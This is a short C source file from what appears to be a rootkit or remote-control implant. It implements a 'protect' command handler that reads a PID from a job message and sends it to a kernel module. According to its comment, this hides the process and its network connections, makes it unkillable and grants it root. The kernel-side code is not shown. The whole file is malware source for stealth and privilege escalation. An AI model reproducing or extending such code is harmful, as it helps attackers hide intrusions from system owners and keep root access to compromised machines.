#include "../inc/cmds.h"
#include "../inc/kernel.h"

#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <errno.h>

/*

 * protect command "protects" a provided PID
 * which hides the associated process, and its network connections
 * it also makes the process unkillable and gives it root

*/

bool protect_pid(pid_t p) {
  return kernel_send(KERNEL_CMD_PROTECT, &p, sizeof(pid_t));
}

char *cmd_protect(job_t *job) {
  cmd_recv_all(job);
  pid_t pid = 0;

  if (job->data_size != sizeof(pid))
    return "invalid data size";

  memcpy(&pid, job->data, sizeof(pid));

  if (pid <= 0)
    return "invalid PID";

  if (!protect_pid(pid))
    return "operation failed";

  return "success";
}
